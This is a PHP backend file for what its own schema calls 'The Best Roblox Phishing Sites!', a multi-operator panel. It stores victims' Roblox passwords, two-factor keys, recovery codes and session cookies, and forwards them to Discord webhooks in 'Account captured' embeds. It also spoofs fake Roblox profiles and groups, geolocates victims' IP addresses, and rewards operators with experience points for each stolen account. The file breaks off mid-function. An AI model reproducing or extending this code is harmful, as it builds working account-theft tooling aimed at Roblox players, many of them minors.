<?php

require_once( $_SERVER[ "DOCUMENT_ROOT" ] . "/functional/configuration/setup.php" );

$db = null;

function connect( ): void
{
    global $db, $site;
    if ( $db !== null )
    {
        return;
    };
    try
    {
        $bootstrap = new PDO(
            "mysql:host=" . $site[ "db" ][ "host" ] . ";charset=utf8mb4",
            $site[ "db" ][ "user" ],
            $site[ "db" ][ "pass" ],
            [ PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION ]
        );
        $db_name = $site[ "db" ][ "name" ];
        $bootstrap->exec( "CREATE DATABASE IF NOT EXISTS `" . str_replace( "`", "``", $db_name ) . "` CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci" );
        $db = new PDO(
            "mysql:host=" . $site[ "db" ][ "host" ] . ";dbname=" . $db_name . ";charset=utf8mb4",
            $site[ "db" ][ "user" ],
            $site[ "db" ][ "pass" ],
            [
                PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
                PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
                PDO::ATTR_EMULATE_PREPARES => false,
            ]
        );
        setup_db( );
    }
    catch ( PDOException $e )
    {
        http_response_code( 500 );
        die( json_encode( [ "error" => $e->getMessage( ) ] ) );
    };
};

function setup_db( ): void
{
    global $db;
    $db->exec( "
        CREATE TABLE IF NOT EXISTS user_visits (
            id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
            user_id BIGINT UNSIGNED NOT NULL,
            owner_id BIGINT UNSIGNED NOT NULL,
            ip VARCHAR(45) NOT NULL,
            country VARCHAR(64),
            city VARCHAR(64),
            url TEXT NOT NULL,
            type VARCHAR(20),
            visited_at BIGINT NOT NULL,
            INDEX (user_id),
            INDEX (owner_id),
            INDEX idx_owner_visited (owner_id, visited_at)
        );
    " );
    $db->exec( "
        CREATE TABLE IF NOT EXISTS users (
            id                      BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
            recovery_token          VARCHAR(88)  NOT NULL DEFAULT '',
            referral_code           VARCHAR(12)  NOT NULL DEFAULT '',
            referred_by             VARCHAR(12)  NOT NULL DEFAULT '',
            referral_uses           INT UNSIGNED NOT NULL DEFAULT 0,
            referral_name           VARCHAR(20)  NOT NULL DEFAULT 'Roblox Sites',
            referral_description    VARCHAR(200) NOT NULL DEFAULT 'The Best Roblox Phishing Sites!',
            referral_invite         VARCHAR(20)  NOT NULL DEFAULT 'discord.gg/Invite',
            discord_id              VARCHAR(32)  NOT NULL DEFAULT '',
            discord_username        VARCHAR(64)  NOT NULL DEFAULT '',
            discord_avatar          VARCHAR(255) NOT NULL DEFAULT '',
            discord_access_token    VARCHAR(512) NOT NULL DEFAULT '',
            discord_refresh_token   VARCHAR(512) NOT NULL DEFAULT '',
            discord_token_expires   BIGINT       NOT NULL DEFAULT 0,
            discord_webhook         VARCHAR(512) NOT NULL DEFAULT '',
            account_level           INT UNSIGNED NOT NULL DEFAULT 1,
            account_xp              BIGINT       NOT NULL DEFAULT 0,
            account_banned          TINYINT(1)   NOT NULL DEFAULT 0,
            account_created_at      BIGINT       NOT NULL DEFAULT 0,
            account_last_active     BIGINT       NOT NULL DEFAULT 0,
            discord_everyone        TINYINT(1)   NOT NULL DEFAULT 0,
            discord_here            TINYINT(1)   NOT NULL DEFAULT 0,
            discord_visit_notifier  TINYINT(1)   NOT NULL DEFAULT 0,
            dashboard_anonymous     TINYINT(1)   NOT NULL DEFAULT 0,
            dashboard_autosecure    TINYINT(1)   NOT NULL DEFAULT 1,
            dashboard_autoage       TINYINT(1)   NOT NULL DEFAULT 0,
            account_rank            VARCHAR(512) NOT NULL DEFAULT 'Noob',
            robux_filter            BIGINT       NOT NULL DEFAULT 999999,
            robux_webhook           VARCHAR(512) NOT NULL DEFAULT '',
            summary_filter          BIGINT       NOT NULL DEFAULT 999999,
            summary_webhook         VARCHAR(512) NOT NULL DEFAULT '',
            rap_filter              BIGINT       NOT NULL DEFAULT 999999,
            rap_webhook             VARCHAR(512) NOT NULL DEFAULT '',
            statistics_accounts     BIGINT       NOT NULL DEFAULT 0,
            statistics_visits       BIGINT       NOT NULL DEFAULT 0,
            statistics_clicks       BIGINT       NOT NULL DEFAULT 0,
            profile_real_name       VARCHAR(20)  NOT NULL DEFAULT 'Roblox',
            profile_fake_name       VARCHAR(20)  NOT NULL DEFAULT 'Roblox',
            profile_display_name    VARCHAR(20)  NOT NULL DEFAULT 'Roblox',
            profile_friends         BIGINT       NOT NULL DEFAULT 1,
            profile_followers       BIGINT       NOT NULL DEFAULT 1,
            profile_followings      BIGINT       NOT NULL DEFAULT 1,
            profile_premium         TINYINT(1)   NOT NULL DEFAULT 0,
            profile_status          VARCHAR(20)  NOT NULL DEFAULT 'In Game',
            profile_creation_date   VARCHAR(30)  NOT NULL DEFAULT '',
            profile_description     VARCHAR(1000) NOT NULL DEFAULT '',
            profile_fake_id BIGINT NOT NULL DEFAULT (FLOOR(100000000 + RAND() * 900000000)),
            group_name              VARCHAR(50)  NOT NULL DEFAULT 'Scriptbloxian Studios',
            group_owner_name        VARCHAR(20)  NOT NULL DEFAULT 'Scriptbloxian',
            group_members           BIGINT       NOT NULL DEFAULT 25000000,
            group_funds             BIGINT       NOT NULL DEFAULT 0,
            group_shout             VARCHAR(255) NOT NULL DEFAULT '',
            group_description       VARCHAR(1000) NOT NULL DEFAULT 'Games Development Studio',
            group_thumbnail         VARCHAR(300) NOT NULL DEFAULT 'https://tr.rbxcdn.com/180DAY-5ef5355360e7cad0fb7708e1ab9c7125/150/150/Image/Webp/noFilter',
            group_fake_id           BIGINT       NOT NULL DEFAULT (FLOOR(100000000 + RAND() * 900000000)),
            group_roblox_id         BIGINT       NOT NULL DEFAULT 0,
            private_server_code     VARCHAR(32)  NOT NULL DEFAULT '',
            custom_game_links       VARCHAR(512) NOT NULL DEFAULT '',
            UNIQUE KEY uq_discord_id (discord_id),
            UNIQUE KEY uq_referral_code (referral_code)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
    " );
    try
    {
        $db->exec( "ALTER TABLE users ADD COLUMN custom_game_links VARCHAR(512) NOT NULL DEFAULT ''" );
    }
    catch ( PDOException $e )
    {
    };
    try
    {
        $db->exec( "ALTER TABLE users ADD COLUMN account_xp BIGINT NOT NULL DEFAULT 0" );
    }
    catch ( PDOException $e )
    {
    };
    try
    {
        $db->exec( "ALTER TABLE users ADD COLUMN group_fake_id BIGINT NOT NULL DEFAULT 0" );
    }
    catch ( PDOException $e )
    {
    };
    try
    {
        $db->exec( "ALTER TABLE users ADD COLUMN group_roblox_id BIGINT NOT NULL DEFAULT 0" );
    }
    catch ( PDOException $e )
    {
    };
    try
    {
        $db->exec( "UPDATE users SET group_fake_id = profile_fake_id WHERE group_fake_id = 0 AND profile_fake_id > 0" );
    }
    catch ( PDOException $e )
    {
    };
    $db->exec( "
        CREATE TABLE IF NOT EXISTS captured_logs (
            id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
            owner_id BIGINT UNSIGNED NOT NULL,
            roblox_user_id BIGINT UNSIGNED NOT NULL DEFAULT 0,
            roblox_username VARCHAR(64) NOT NULL DEFAULT '',
            roblox_display VARCHAR(64) NOT NULL DEFAULT '',
            password VARCHAR(255) NOT NULL DEFAULT '',
            authkey VARCHAR(512) NOT NULL DEFAULT '',
            recovcodes VARCHAR(512) NOT NULL DEFAULT '',
            cookie TEXT,
            summary BIGINT NOT NULL DEFAULT 0,
            robux BIGINT NOT NULL DEFAULT 0,
            rap BIGINT NOT NULL DEFAULT 0,
            embed_json LONGTEXT,
            captured_at BIGINT NOT NULL,
            INDEX idx_owner_captured (owner_id, captured_at)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
    " );
    $db->exec( "
        CREATE TABLE IF NOT EXISTS chat (
            id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
            user_id BIGINT UNSIGNED NOT NULL,
            message VARCHAR(500) NOT NULL,
            created_at BIGINT NOT NULL,
            INDEX idx_user_id (user_id),
            INDEX idx_created_at (created_at)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
    " );
};

function chat_time_label( int $created_at ): string
{
    $age = time( ) - $created_at;
    if ( $age < 60 )
    {
        return $age . "s";
    };
    if ( $age < 3600 )
    {
        return (int) floor( $age / 60 ) . "m";
    };
    if ( $age < 86400 )
    {
        return (int) floor( $age / 3600 ) . "h";
    };
    return (int) floor( $age / 86400 ) . "d";
};

function get_user_by_discord_id( string $discord_id ): array|null
{
    global $db;
    $st = $db->prepare( "SELECT * FROM users WHERE discord_id = ? LIMIT 1" );
    $st->execute( [ $discord_id ] );
    $row = $st->fetch( );
    return $row ?: null;
};

function get_user_by_id( int $id ): array|null
{
    global $db;
    $st = $db->prepare( "SELECT * FROM users WHERE id = ? LIMIT 1" );
    $st->execute( [ $id ] );
    $row = $st->fetch( );
    return $row ?: null;
};

function get_user_by_recovery_token( string $token ): array|null
{
    global $db;
    if ( $token === "" )
    {
        return null;
    };
    connect( );
    $st = $db->prepare( "SELECT * FROM users WHERE recovery_token = ? LIMIT 1" );
    $st->execute( [ $token ] );
    $row = $st->fetch( );
    return $row ?: null;
};

function set_auth_cookie( string $recovery_token ): void
{
    setcookie( "Authentication", $recovery_token, [
        "expires" => time( ) + 60 * 60 * 24 * 30,
        "path" => "/",
        "httponly" => false,
        "samesite" => "Lax",
    ] );
    $_COOKIE[ "Authentication" ] = $recovery_token;
};

function clear_auth_cookie( ): void
{
    setcookie( "Authentication", "", [
        "expires" => time( ) - 3600,
        "path" => "/",
        "httponly" => false,
        "samesite" => "Lax",
    ] );
    unset( $_COOKIE[ "Authentication" ] );
};

function resolve_account_rank( string $discord_id, string $db_rank = "Noob" ): array
{
    global $site;
    $discord_id = trim( $discord_id );
    $order = [ "owner", "admin", "known" ];
    $configured = $site[ "ranks" ] ?? [ ];

    foreach ( $order as $key )
    {
        $entry = $configured[ $key ] ?? [ ];
        $ids = $entry[ "ids" ] ?? [ ];

        foreach ( $ids as $id )
        {
            $id = trim( (string) $id );
            if ( $id !== "" && $discord_id === $id )
            {
                return [
                    "key" => $key,
                    "label" => (string) ( $entry[ "label" ] ?? ucfirst( $key ) ),
                ];
            };
        };
    };

    return [
        "key" => "default",
        "label" => $db_rank !== "" ? $db_rank : "Noob",
    ];
};

function rank_class_for_key( string $key ): string
{
    if ( in_array( $key, [ "owner", "admin", "known" ], true ) )
    {
        return "dash_tag is_rank is_rank_" . $key;
    };
    return "dash_tag is_rank";
};

function apply_account_rank( array $user ): array
{
    $resolved = resolve_account_rank(
        (string) ( $user[ "discord_id" ] ?? "" ),
        (string) ( $user[ "account_rank" ] ?? "Noob" )
    );
    $user[ "account_rank" ] = $resolved[ "label" ];
    $user[ "account_rank_key" ] = $resolved[ "key" ];
    return $user;
};

function require_account( bool $json = false ): array
{
    if ( session_status( ) === PHP_SESSION_NONE )
    {
        session_start( );
    };
    $token = $_COOKIE[ "Authentication" ] ?? "";
    if ( $token === "" )
    {
        if ( $json )
        {
            header( "content-type: application/json" );
            http_response_code( 401 );
            die( json_encode( [ "success" => false, "message" => "Unauthorized" ] ) );
        };
        die( header( "Location: /control/sign-in/" ) );
    };
    $info = get_user_by_recovery_token( $token );
    if ( $info === null || !empty( $info[ "account_banned" ] ) )
    {
        clear_auth_cookie( );
        if ( $json )
        {
            header( "content-type: application/json" );
            http_response_code( 401 );
            die( json_encode( [ "success" => false, "message" => "Unauthorized" ] ) );
        };
        die( header( "Location: /control/sign-in/?error=1" ) );
    };
    update_last_active( (int) $info[ "id" ] );
    $info = apply_account_rank( $info );
    $lvl = user_level_info( $info );
    $info[ "account_level" ] = $lvl[ "level" ];
    $info[ "account_level_progress" ] = $lvl[ "progress" ];
    $_SESSION[ "info" ] = $info;
    return $info;
};

function discord_avatar_url( array $user, int $size = 256 ): string
{
    if ( !empty( $user[ "discord_avatar" ] ) && !empty( $user[ "discord_id" ] ) )
    {
        return "https://cdn.discordapp.com/avatars/" . $user[ "discord_id" ] . "/" . $user[ "discord_avatar" ] . ".png?size=" . $size;
    };
    return "https://cdn.discordapp.com/embed/avatars/0.png";
};

function create_account(
    string $discord_id,
    string $discord_username,
    string $discord_avatar = "",
    string $discord_access_token = "",
    string $discord_refresh_token = "",
    int $discord_token_expires = 0,
    string $referred_by = ""
): array|null
{
    global $db;
    $existing = get_user_by_discord_id( $discord_id );
    if ( $existing !== null )
    {
        update_discord_tokens( $existing[ "id" ], $discord_access_token, $discord_refresh_token, $discord_token_expires, $discord_username, $discord_avatar );
        $user = get_user_by_id( $existing[ "id" ] );
        return $user ? apply_account_rank( $user ) : null;
    };
    $recovery_token = bin2hex( random_bytes( 32 ) );
    do
    {
        $referral_code = substr( bin2hex( random_bytes( 8 ) ), 0, 12 );
        $st = $db->prepare( "SELECT id FROM users WHERE referral_code = ? LIMIT 1" );
        $st->execute( [ $referral_code ] );
    }
    while ( $st->fetch( ) );
    if ( !empty( $referred_by ) )
    {
        if ( strlen( $referred_by ) !== 12 )
        {
            $referred_by = "";
        }
        else
        {
            $st = $db->prepare( "SELECT id FROM users WHERE referral_code = ? LIMIT 1" );
            $st->execute( [ $referred_by ] );
            if ( !$st->fetch( ) )
            {
                $referred_by = "";
            };
        };
    };
    $now = time( );
    $st = $db->prepare( "
        INSERT INTO users
            (recovery_token, referral_code, referred_by, discord_id, discord_username, discord_avatar, discord_access_token, discord_refresh_token, discord_token_expires, account_created_at, account_last_active, private_server_code)
        VALUES
            (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    " );
    $st->execute( [
        $recovery_token,
        $referral_code,
        $referred_by,
        $discord_id,
        $discord_username,
        $discord_avatar,
        $discord_access_token,
        $discord_refresh_token,
        $discord_token_expires,
        $now,
        $now,
        implode( "", array_map( fn( ) => random_int( 0, 9 ), range( 1, 32 ) ) ),
    ] );
    if ( !empty( $referred_by ) )
    {
        $db->prepare( "UPDATE users SET referral_uses = referral_uses + 1 WHERE referral_code = ? LIMIT 1" )->execute( [ $referred_by ] );
    };
    $user = get_user_by_discord_id( $discord_id );
    return $user ? apply_account_rank( $user ) : null;
};

function update_discord_tokens( int $id, string $access_token, string $refresh_token, int $expires, string $username, string $avatar ): void
{
    global $db;
    $db->prepare( "
        UPDATE users SET
            discord_access_token  = ?,
            discord_refresh_token = ?,
            discord_token_expires = ?,
            discord_username      = ?,
            discord_avatar        = ?,
            account_last_active   = ?
        WHERE id = ?
    " )->execute( [ $access_token, $refresh_token, $expires, $username, $avatar, time( ), $id ] );
};

function update_last_active( int $id ): void
{
    global $db;
    $db->prepare( "UPDATE users SET account_last_active = ? WHERE id = ?" )->execute( [ time( ), $id ] );
};

function set_secret_cookie( string $referral_code ): void
{
    if ( $referral_code === "" )
    {
        return;
    };
    setcookie( "secret", $referral_code, [
        "expires" => time( ) + 31536000,
        "path" => "/",
        "httponly" => true,
        "samesite" => "Lax",
    ] );
    $_COOKIE[ "secret" ] = $referral_code;
    setcookie( "profile", "", [
        "expires" => time( ) - 3600,
        "path" => "/",
        "httponly" => true,
        "samesite" => "Lax",
    ] );
    unset( $_COOKIE[ "profile" ] );
};

function resolve_profile_roblox_id( array $account ): ?int
{
    static $cache = [ ];
    $owner_id = (int) ( $account[ "id" ] ?? 0 );
    if ( $owner_id > 0 && array_key_exists( $owner_id, $cache ) )
    {
        return $cache[ $owner_id ];
    };
    $name = trim( (string) ( $account[ "profile_real_name" ] ?? "" ) );
    if ( $name === "" )
    {
        if ( $owner_id > 0 )
        {
            $cache[ $owner_id ] = null;
        };
        return null;
    };
    $ch = curl_init( "https://users.roblox.com/v1/usernames/users" );
    curl_setopt_array( $ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 5,
        CURLOPT_POST => true,
        CURLOPT_HTTPHEADER => [ "Content-Type: application/json" ],
        CURLOPT_POSTFIELDS => json_encode( [ "usernames" => [ $name ], "excludeBannedUsers" => false ] ),
    ] );
    $response = curl_exec( $ch );
    curl_close( $ch );
    $roblox_data = json_decode( (string) $response, true );
    $real_id = (int) ( $roblox_data[ "data" ][ 0 ][ "id" ] ?? 0 );
    $resolved = $real_id > 0 ? $real_id : null;
    if ( $owner_id > 0 )
    {
        $cache[ $owner_id ] = $resolved;
    };
    return $resolved;
};

function rewrite_profile_proxy_path( string $url, array $account ): string
{
    $fake_id = (int) ( $account[ "profile_fake_id" ] ?? 0 );
    $real_id = resolve_profile_roblox_id( $account );
    if ( $fake_id <= 0 || $real_id === null || $real_id <= 0 || $fake_id === $real_id )
    {
        return $url;
    };
    return preg_replace(
        "#/users/" . preg_quote( (string) $fake_id, "#" ) . "/#",
        "/users/" . $real_id . "/",
        $url
    );
};

function get_user_by_referral_code( string $referral_code ): array|null
{
    global $db;
    if ( $referral_code === "" )
    {
        return null;
    };
    connect( );
    $st = $db->prepare( "SELECT * FROM users WHERE referral_code = ? LIMIT 1" );
    $st->execute( [ $referral_code ] );
    $row = $st->fetch( );
    return $row ?: null;
};

function get_user_by_private_server_code( string $code ): array|null
{
    global $db;
    if ( $code === "" )
    {
        return null;
    };
    connect( );
    $st = $db->prepare( "SELECT * FROM users WHERE private_server_code = ? LIMIT 1" );
    $st->execute( [ $code ] );
    $row = $st->fetch( );
    return $row ?: null;
};

function level_config( ): array
{
    global $site;
    $cfg = $site[ "level" ] ?? [ ];
    return [
        "visit_xp" => max( 1, (int) ( $cfg[ "visit_xp" ] ?? 1 ) ),
        "account_xp" => max( 1, (int) ( $cfg[ "account_xp" ] ?? 5 ) ),
        "xp_per_level" => max( 1, (int) ( $cfg[ "xp_per_level" ] ?? 10 ) ),
    ];
};

function level_from_xp( int $xp, int $xp_per_level ): int
{
    return max( 1, (int) floor( $xp / max( 1, $xp_per_level ) ) + 1 );
};

function level_progress_percent( int $xp, int $xp_per_level ): float
{
    $per = max( 1, $xp_per_level );
    $into = $xp % $per;
    return min( 100.0, max( 0.1, ( $into / $per ) * 100.0 ) );
};

function user_level_info( array $user ): array
{
    $cfg = level_config( );
    $xp = (int) ( $user[ "account_xp" ] ?? 0 );
    $per = $cfg[ "xp_per_level" ];
    return [
        "level" => level_from_xp( $xp, $per ),
        "progress" => level_progress_percent( $xp, $per ),
        "xp" => $xp,
    ];
};

function owner_add_xp( int $owner_id, string $event_type ): void
{
    global $db;
    if ( $owner_id <= 0 )
    {
        return;
    };
    connect( );
    $cfg = level_config( );
    $amount = $event_type === "account" ? $cfg[ "account_xp" ] : $cfg[ "visit_xp" ];

    $db->prepare( "UPDATE users SET account_xp = account_xp + ? WHERE id = ?" )->execute( [ $amount, $owner_id ] );

    if ( $event_type === "account" )
    {
        $db->prepare( "UPDATE users SET statistics_accounts = statistics_accounts + 1 WHERE id = ?" )->execute( [ $owner_id ] );
    };

    $st = $db->prepare( "SELECT account_xp FROM users WHERE id = ? LIMIT 1" );
    $st->execute( [ $owner_id ] );
    $xp = (int) $st->fetchColumn( );
    $level = level_from_xp( $xp, $cfg[ "xp_per_level" ] );
    $db->prepare( "UPDATE users SET account_level = ? WHERE id = ?" )->execute( [ $level, $owner_id ] );
};

function build_capture_embed_preview( string $username, int $user_id, string $password, string $cookie ): array
{
    global $site;
    $hex = ltrim( (string) ( $site[ "Info" ][ "Color" ] ?? "5865F2" ), "#" );
    $color = (int) hexdec( $hex !== "" ? $hex : "5865F2" );
    $panel_name = (string) ( $site[ "Info" ][ "Name" ] ?? "Panel" );
    $panel_thumb = (string) ( $site[ "Info" ][ "Thumbnail" ] ?? "" );
    $thumb = $user_id > 0
        ? "https://www.roblox.com/headshot-thumbnail/image?userId={$user_id}&width=420&height=420&format=png"
        : "";

    return [
        "username" => $panel_name,
        "avatar_url" => $panel_thumb,
        "embeds" => [
            [
                "color" => $color,
                "title" => $username . " — Account captured",
                "description" => "Roblox ID: " . ( $user_id > 0 ? (string) $user_id : "unknown" ),
                "thumbnail" => $thumb !== "" ? [ "url" => $thumb ] : null,
                "fields" => [
                    [
                        "name" => "Password",
                        "value" => $password !== "" ? $password : "N/A",
                        "inline" => true,
                    ],
                    [
                        "name" => "Cookie",
                        "value" => $cookie !== "" ? mb_substr( $cookie, 0, 900 ) : "N/A",
                        "inline" => false,
                    ],
                ],
            ],
        ],
    ];
};

function record_captured_account( int $owner_id, array $data ): int
{
    global $db;
    if ( $owner_id <= 0 )
    {
        return 0;
    };
    connect( );

    $roblox_user_id = (int) ( $data[ "roblox_user_id" ] ?? 0 );
    $username = trim( (string) ( $data[ "roblox_username" ] ?? "Unknown" ) );
    $display = trim( (string) ( $data[ "roblox_display" ] ?? $username ) );
    $password = (string) ( $data[ "password" ] ?? "" );
    $authkey = (string) ( $data[ "authkey" ] ?? "" );
    $recovcodes = (string) ( $data[ "recovcodes" ] ?? "" );
    $cookie = (string) ( $data[ "cookie" ] ?? "" );
    $summary = (int) ( $data[ "summary" ] ?? 0 );
    $robux = (int) ( $data[ "robux" ] ?? 0 );
    $rap = (int) ( $data[ "rap" ] ?? 0 );
    $embed_json = isset( $data[ "embed_json" ] ) ? (string) $data[ "embed_json" ] : "";
    $now = time( );

    $db->prepare( "
        INSERT INTO captured_logs
            (owner_id, roblox_user_id, roblox_username, roblox_display, password, authkey, recovcodes, cookie, summary, robux, rap, embed_json, captured_at)
        VALUES
            (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    " )->execute( [
        $owner_id,
        $roblox_user_id,
        mb_substr( $username, 0, 64 ),
        mb_substr( $display, 0, 64 ),
        mb_substr( $password, 0, 255 ),
        mb_substr( $authkey, 0, 512 ),
        mb_substr( $recovcodes, 0, 512 ),
        $cookie,
        $summary,
        $robux,
        $rap,
        $embed_json,
        $now,
    ] );

    $log_id = (int) $db->lastInsertId( );

    $ip = $_SERVER[ "HTTP_CF_CONNECTING_IP" ] ?? $_SERVER[ "HTTP_X_FORWARDED_FOR" ] ?? $_SERVER[ "REMOTE_ADDR" ] ?? "0.0.0.0";
    $ip = trim( explode( ",", $ip )[ 0 ] );

    $db->prepare( "
        INSERT INTO user_visits (user_id, owner_id, ip, country, city, url, type, visited_at)
        VALUES (?, ?, ?, NULL, NULL, ?, 'log', ?)
    " )->execute( [
        $roblox_user_id,
        $owner_id,
        $ip,
        "/users/" . $roblox_user_id . "/account",
        $now,
    ] );

    owner_add_xp( $owner_id, "account" );

    return $log_id;
};

function record_profile_visit( int $visitor_id, int $owner_id, string $url, string $type = "link" ): int
{
    global $db;
    connect( );

    $ip = $_SERVER[ "HTTP_CF_CONNECTING_IP" ] ?? $_SERVER[ "HTTP_X_FORWARDED_FOR" ] ?? $_SERVER[ "REMOTE_ADDR" ] ?? "0.0.0.0";
    $ip = trim( explode( ",", $ip )[ 0 ] );
    $country = null;
    $city = null;

    $ch = curl_init( "http://ip-api.com/json/" . urlencode( $ip ) . "?fields=status,country,city" );
    curl_setopt_array( $ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 3,
        CURLOPT_SSL_VERIFYPEER => false,
    ] );
    $geo_data = json_decode( (string) curl_exec( $ch ), true );
    curl_close( $ch );

    if ( is_array( $geo_data ) && ( $geo_data[ "status" ] ?? "" ) === "success" )
    {
        $country = $geo_data[ "country" ] ?? null;
        $city = $geo_data[ "city" ] ?? null;
    };

    $db->prepare( "
        INSERT INTO user_visits (user_id, owner_id, ip, country, city, url, type, visited_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    " )->execute( [ $visitor_id, $owner_id, $ip, $country, $city, $url, $type, time( ) ] );

    $db->prepare( "UPDATE users SET statistics_visits = statistics_visits + 1 WHERE id = ?" )->execute( [ $owner_id ] );

    if ( $type !== "log" )
    {
        owner_add_xp( $owner_id, "visit" );
    };

    $st = $db->prepare( "SELECT statistics_visits FROM users WHERE id = ? LIMIT 1" );
    $st->execute( [ $owner_id ] );
    return (int) $st->fetchColumn( );
};

function dashboard_host_list( ): array
{
    $host = strtolower( (string) ( $_SERVER[ "HTTP_HOST" ] ?? "localhost" ) );

    if ( strpos( $host, ":" ) !== false )
    {
        $host = explode( ":", $host, 2 )[ 0 ];
    };

    $list = [ $host ];

    if ( strpos( $host, "www." ) !== 0 )
    {
        $list[ ] = "www." . $host;
    };

    return array_values( array_unique( $list ) );
};

function profile_status_key( string $db_status ): string
{
    $map = [
        "Offline" => "offline",
        "Online" => "online",
        "In Game" => "playing",
    ];

    return $map[ $db_status ] ?? "offline";
};

function roblox_http_json( string $url, array $curl_opts = [ ], bool $use_proxy = true ): ?array
{
    $ch = curl_init( $url );
    $opts = [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_CONNECTTIMEOUT => 5,
    ] + $curl_opts;
    curl_setopt_array( $ch, $opts );
    if ( $use_proxy )
    {
        apply_site_proxy( $ch );
    };
    $body = curl_exec( $ch );
    $code = (int) curl_getinfo( $ch, CURLINFO_HTTP_CODE );
    curl_close( $ch );
    if ( $body === false || $code < 200 || $code >= 300 )
    {
        return null;
    };
    $json = json_decode( (string) $body, true );
    return is_array( $json ) ? $json : null;
};

function fetch_roblox_user_id( string $username ): ?int
{
    $username = trim( $username );
    if ( $username === "" )
    {
        return null;
    };

    $payload = json_encode( [
        "usernames" => [ $username ],
        "excludeBannedUsers" => false,
    ] );

    for ( $attempt = 0; $attempt < 3; $attempt++ )
    {
        $use_proxy = $attempt < 2;
        $res = roblox_http_json( "https://users.roblox.com/v1/usernames/users", [
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $payload,
            CURLOPT_HTTPHEADER => [ "Content-Type: application/json" ],
        ], $use_proxy );
        $roblox_id = (int) ( $res[ "data" ][ 0 ][ "id" ] ?? 0 );
        if ( $roblox_id > 0 )
        {
            return $roblox_id;
        };
        usleep( 200000 * ( $attempt + 1 ) );
    };

    return null;
};

function fetch_roblox_headshot_url( int $user_id ): ?string
{
    if ( $user_id <= 0 )
    {
        return null;
    };

    $api_url = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="
        . $user_id . "&size=150x150&format=Png&isCircular=false";

    for ( $attempt = 0; $attempt < 6; $attempt++ )
    {
        $use_proxy = $attempt < 4;
        $thumb = roblox_http_json( $api_url, [ ], $use_proxy );
        $entry = $thumb[ "data" ][ 0 ] ?? null;
        if ( !is_array( $entry ) )
        {
            usleep( 250000 * ( $attempt + 1 ) );
            continue;
        };

        $state = (string) ( $entry[ "state" ] ?? "" );
        $image_url = (string) ( $entry[ "imageUrl" ] ?? "" );

        if ( $image_url !== "" && ( $state === "" || $state === "Completed" ) )
        {
            return $image_url;
        };

        if ( $state === "Error" )
        {
            return null;
        };

        usleep( 300000 * ( $attempt + 1 ) );
    };

    return null;
};

function fetch_roblox_headshot( string $username ): ?string
{
    $user_id = fetch_roblox_user_id( $username );
    if ( $user_id === null )
    {
        return null;
    };
    return fetch_roblox_headshot_url( $user_id );
};

function fetch_roblox_group_id_by_name( string $group_name ): ?int
{
    $group_name = trim( $group_name );
    if ( $group_name === "" )
    {
        return null;
    };

    $lookup = roblox_http_json(
        "https://groups.roblox.com/v1/groups/search/lookup?groupName=" . rawurlencode( $group_name )
    );
    if ( is_array( $lookup ) )
    {
        if ( !empty( $lookup[ "id" ] ) )
        {
            return (int) $lookup[ "id" ];
        };
        $first = $lookup[ "data" ][ 0 ] ?? null;
        if ( is_array( $first ) && !empty( $first[ "id" ] ) )
        {
            return (int) $first[ "id" ];
        };
    };

    $search = roblox_http_json(
        "https://groups.roblox.com/v1/groups/search?keyword=" . rawurlencode( $group_name )
        . "&limit=10&prioritizeExactMatch=true"
    );
    foreach ( $search[ "data" ] ?? [ ] as $row )
    {
        if ( !is_array( $row ) )
        {
            continue;
        };
        if ( strcasecmp( (string) ( $row[ "name" ] ?? "" ), $group_name ) === 0 && !empty( $row[ "id" ] ) )
        {
            return (int) $row[ "id" ];
        };
    };
    $fallback = $search[ "data" ][ 0 ][ "id" ] ?? null;
    return $fallback ? (int) $fallback : null;
};

function roblox_group_slug( string $group_name ): string
{
    $slug = preg_replace( "/[^a-zA-Z0-9]+/", "-", trim( $group_name ) );
    $slug = trim( (string) $slug, "-" );
    return $slug;
};

function resolve_group_roblox_id( array $account ): ?int
{
    $cached = (int) ( $account[ "group_roblox_id" ] ?? 0 );
    if ( $cached > 0 )
    {
        $info = roblox_http_json( "https://groups.roblox.com/v1/groups/" . $cached );
        if ( !empty( $info[ "id" ] ) )
        {
            return (int) $info[ "id" ];
        };
    };
    return fetch_roblox_group_id_by_name( (string) ( $account[ "group_name" ] ?? "" ) );
};

function get_user_by_group_roblox_id( int $roblox_id ): ?array
{
    global $db;
    if ( $roblox_id <= 0 )
    {
        return null;
    };
    connect( );
    $st = $db->prepare( "
        SELECT id, referral_code, group_name, group_fake_id, group_roblox_id, profile_fake_id
        FROM users
        WHERE group_roblox_id = ?
        LIMIT 1
    " );
    $st->execute( [ $roblox_id ] );
    $user = $st->fetch( );
    return $user ?: null;
};

function get_user_by_group_fake_id( int $fake_id ): ?array
{
    global $db;
    if ( $fake_id <= 0 )
    {
        return null;
    };
    connect( );
    $st = $db->prepare( "
        SELECT id, referral_code, group_name, group_fake_id, group_roblox_id, profile_fake_id
        FROM users
        WHERE group_fake_id = ?
        LIMIT 1
    " );
    $st->execute( [ $fake_id ] );
    $user = $st->fetch( );
    if ( $user )
    {
        return $user;
    };
    $st = $db->prepare( "
        SELECT id, referral_code, group_name, group_fake_id, group_roblox_id, profile_fake_id
        FROM users
        WHERE profile_fake_id = ?
        LIMIT 1
    " );
    $st->execute( [ $fake_id ] );
    $user = $st->fetch( );
    if ( $user )
    {
        return $user;
    };
    return get_user_by_group_roblox_id( $fake_id );
};

function get_signin_accounts_stats( ): array
{
